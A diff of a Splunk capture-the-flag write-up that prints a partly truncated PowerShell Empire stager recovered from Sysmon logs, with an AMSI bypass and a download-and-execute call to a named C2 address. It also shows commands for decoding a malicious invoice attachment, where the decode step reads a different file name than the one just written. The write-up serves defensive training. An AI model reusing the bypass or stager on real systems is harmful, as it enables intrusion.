@@ -805,11 +805,13 @@ index="botsv2" powershell sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Op
 ```
 This still results in over 50,000 events looking at interesting fields selecting 'commandline' in top 10 is oa few interesting commands, ftp.exe and powershell related. The powershell command that stands out is as follows:
 ```
-C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAM....AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
+C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc WwBSAGUARgBdAC4AQQBTAHMARQBNAGIATABZAC4ARwBlAFQAVAAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAM....
+AQQBUAEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
 ```
 - From observation clearly encoded in base64, after decoding base64, removing null types, decoding url. What stands out is that this is likely a stager for Empire. Large parts cut out due to detection by antivirus, sorry about that (....).
 ```
-[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed',....;$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
+[ReF].ASsEMbLY.GeTTYpe('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFIEld('amsiInitFailed',....
+;$ser='https://45.77.65.211:443';$t='/admin/get.php';$dAtA=$WC.DOwnlOaDDatA($SER $t);$Iv=$DATA[0..3];$dATA=$DaTA[4..$DatA.LeNgTh];-join[ChAR[]](& $R $DATA ($IV $K))|IEXÔ
 ```
 
 **Key Indicators**
@@ -830,3 +832,20 @@ Connection to attacker C2 IP we have seen earlier:
 Downloads the payload, decrypts and executes with IEX.
 
 The other FTP command was related but don't directly to this stager.
+
+**Q5 Within the document, what kind of points is mentioned if you found the text?**
+
+- This relates not to what was just covered but the invoice.zip file from earlier its a little out of place.
+- From the file that contained the interesting code in base64 that was clearly the invoice.zip file.
+		- Convert to single line dropping returnlines and end space this worked for me in linux:
+  		```
+		grep -o '[A-Za-z0-9+/=]\+' invoiceb64.txt | tr -d '\n' > b64.txt
+		```
+		- Decode
+  		```
+		base64 -d cleaned.txt > invoice_decodedb64.zip
+  		```
+		- unzip using password from earlier and you get invoice.doc produced
+  		```
+		unzip invoice_decodedb64.zip
+  		```
